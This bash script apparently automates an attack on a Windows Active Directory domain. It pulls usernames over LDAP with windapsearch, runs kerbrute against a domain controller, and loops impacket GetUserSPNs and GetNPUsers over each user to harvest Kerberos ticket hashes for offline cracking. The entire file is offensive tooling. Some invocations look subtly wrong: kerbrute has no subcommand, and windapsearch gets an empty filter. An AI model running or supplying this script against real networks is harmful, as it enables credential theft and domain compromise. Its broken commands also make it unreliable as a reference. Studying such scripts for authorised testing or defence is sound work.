#!/bin/bash

# Check for root privileges
if [ "$EUID" -ne 0 ]; then
    echo "Please run this script with sudo privileges."
    exit 1
fi

# Prompt for the domain name
read -p "Enter the domain name you found from nmap: " domain_name

# Use windapsearch to get usernames from LDAP
echo "Using windapsearch to get usernames from LDAP"

# Run the windapsearch command with the constructed regex
# Define the path to the windapsearch executable
WINDAPSEARCH="./tools/windapsearch-linux-amd64"

# Run windapsearch based on the domain_name variable
$WINDAPSEARCH -d "$domain_name" -m users --filter | grep -o 'userPrincipalName: [^ ]*' | cut -d ' ' -f 2 > $domain_name-Users.txt
echo "Usernames will be saved in a text file."

# Color codes
RED='\033[0;31m'
NC='\033[0m' # No color

# Prompt the user
echo -e "${RED}Performing kerberoasting, please ensure you know the domain password policy to avoid account lockout.${NC}"
echo -e "${RED}Are you sure you want to proceed with kerberoasting? (y/n)${NC}"

# Read user input
read -r answer

# Check the user's response
if [ "$answer" == "y" ] || [ "$answer" == "Y" ]; then
    # Proceed with kerberoasting
    echo "Proceeding with kerberoasting..."
    read -p "Enter domain IP address: " domain_ip
    KERBRUTE="./tools/kerbrute_linux_amd64"
    $KERBRUTE "$domain_name-Users.txt" --dc "$domain_ip" -d "$domain_name"
elif [ "$answer" == "n" ] || [ "$answer" == "N" ]; then
    # User chose not to proceed
    echo "Kerberoasting canceled."
else
    # Handle invalid input
    echo "Invalid input. Please enter 'y' to proceed or 'n' to cancel."
fi

# Function to check and install Python package
function check_python_package() {
    if python -c "import $1" 2>/dev/null; then
        echo "$1 is installed."
    else
        echo "$1 is not installed."
        echo "Installing $1..."
        pip install "$1"
    fi
}

# Using impacket for kerberoasting
USERS_FILE="$domain_name-Users.txt"

# Check if the users file exists
if [ -f "$USERS_FILE" ]; then
  # Loop through the usernames in the file
  while IFS= read -r username; do
    # Run the script for each username
    impacket-GetUserSPNs -request -dc-ip "$domain_ip" "$domain_name/$username" -no-pass
    impacket-GetNPUsers -request -dc-ip "$domain_ip" "$domain_name/$username" -no-pass
  done < "$USERS_FILE"
else
  echo "Usernames file $USERS_FILE not found."
fi


